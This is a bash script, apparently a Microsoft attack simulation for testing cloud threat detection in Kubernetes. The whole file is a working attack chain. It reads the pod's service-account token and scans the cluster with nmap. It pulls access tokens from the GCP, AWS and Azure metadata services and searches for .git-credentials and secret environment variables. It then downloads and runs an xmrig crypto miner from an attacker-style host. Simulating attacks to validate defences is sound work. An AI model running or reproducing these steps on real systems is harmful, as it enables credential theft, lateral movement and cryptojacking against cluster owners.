#!/bin/bash

# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

# recon
echo "--- Reconnaissance ---"
echo "Checking read permissions for other pods via SelfSubjectAccessReview api request"
kubetoken=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`
body='{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","metadata":{"creationTimestamp":null},"spec":{"resourceAttributes":{"namespace":"default","verb":"get","resource":"pods"}},"status":{}}'
accessReview=`curl -s -k -A "kubectl" -H "Authorization: Bearer $kubetoken"  -H "Content-Type: application/json" -X POST -d $body "https://kubernetes.default/apis/authorization.k8s.io/v1/selfsubjectaccessreviews"| grep -Po '"status":\{\K.*?(?=\})'`
echo "Results:  $accessReview"
echo " "
echo "Searching for pods listening on port 443 via Nmap: "
nmap  -Pn --open kubernetes.default/24 -p 443
echo " "

# lateral-mov
echo "--- Lateral Movement ---"
echo "Sending request to IMDS to retrieve cloud identity token"
if token=$(curl -s -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"| grep -Po '"access_token":"\K.*?(?=")'); then
    cloud="GCP"
elif awstoken=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); then
    cloud="AWS"
    roles=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials" -H "X-aws-ec2-metadata-token: $awstoken")
    for role in $roles; do
        token=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" -H "X-aws-ec2-metadata-token: $awstoken" | grep -Po '"Token" : "\K.*?(?=")')
    done
else
    cloud="Azure"
    subId=$(curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2017-08-01&format=text")
    rg=$(curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2017-08-01&format=text")
    location=$(curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance/compute/location?api-version=2017-08-01&format=text")
    cluster=$(echo $rg | grep -Po "[^_]+(?=_$location)")
    identity="/subscriptions/$subId/resourcegroups/$rg/providers/Microsoft.ManagedIdentity/userAssignedIdentities/$cluster-agentpool"
    imds_addr="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com"
    imds_res=$(curl -sf -H Metadata:true "$imds_addr" ||curl -sf -H Metadata:true "$imds_addr&msi_res_id=$identity")
    token=$(echo $imds_res | grep -Po '"Access_token":"\K.*?(?=")')
fi
test $token && echo "$cloud token: $token" | head -c 30 && echo "..." || echo "No token found"
echo " "

# secrets
echo "--- Secrets Gathering ---"
echo "Searching for sensitive files"
git_creds_file=$(find / -path */.git-credentials 2>/dev/null)
if (test -n $git_creds_file); then
    git_creds=$(cat $git_creds_file)
    echo "Found .git-credential at $git_creds_file: $git_creds"
else
    echo ".git-credential not found"
fi
echo " "
kube_token_file="/var/run/secrets/kubernetes.io/serviceaccount/token"
if (test -f $kube_token_file); then
    kube_token=$(cat $kube_token_file | head -c 30 && echo "...")
    echo "Found Kubernetes service account in $kube_token_file: $kube_token"
else
    echo "Kubernetes service account token not found"
fi
echo " "
echo "Looking for secrets in environment variables"
case $cloud in 
    gcp)
        set | grep GOOGLE_DEFAULT_CLIENT_SECRET= || echo "No secrets found in environment variable"
        ;;
    aws)
        set | grep AWS_SECRET_ACCESS_KEY= || echo "No secrets found in environment variable"
        ;;
    *)
        set | grep AZURE_CREDENTIAL_FILE= || echo "No secrets found in environment variable"
        ;;
    esac
echo " "

# crypto
echo "--- Cryptomining ---"
echo "Optimizing host for mining"
/sbin/modprobe msr allow_writes=on > /dev/null 2>&1
touch /etc/ld.so.preload 
echo "Downloading and running Xmrig crypto miner"
curl -sO http://mdc-simulation-attacker/xmrig
chmod +x xmrig  
./xmrig
echo " "
